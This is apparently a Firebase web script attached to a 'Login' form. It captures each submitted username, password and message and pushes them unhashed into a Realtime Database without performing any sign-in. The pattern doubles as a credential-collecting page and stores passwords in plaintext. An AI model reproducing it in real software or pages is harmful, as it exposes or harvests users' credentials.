const firebaseConfig = {
  apiKey: "AIzaSyAbGwqLpEtPmkllUF0nKGLf0sf9Jv_hTIA",
  authDomain: "servetsyo.firebaseapp.com",
  databaseURL: "https://servetsyo-default-rtdb.firebaseio.com",
  projectId: "servetsyo",
  storageBucket: "servetsyo.appspot.com",
  messagingSenderId: "429091828265",
  appId: "1:429091828265:web:0dbc2045a3ae294479e238"
};

// initialize firebase
firebase.initializeApp(firebaseConfig);

// reference your database
var LoginDB = firebase.database().ref("Login");

document.getElementById("Login").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

  var username = getElementVal("username");
  var password = getElementVal("password");
  var msgContent = getElementVal("msgContent");

  saveMessages(username, password, msgContent);

  //   enable alert
  document.querySelector(".alert").style.display = "block";

  //   remove the alert
  setTimeout(() => {
    document.querySelector(".alert").style.display = "none";
  }, 3000);

  //   reset the form
  document.getElementById("Login").reset();
}

const saveMessages = (username, password, msgContent) => {
  var newLogin = LoginDB.push();

  newLogin.set({
    username: username,
    password: password,
    msgContent: msgContent,
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};
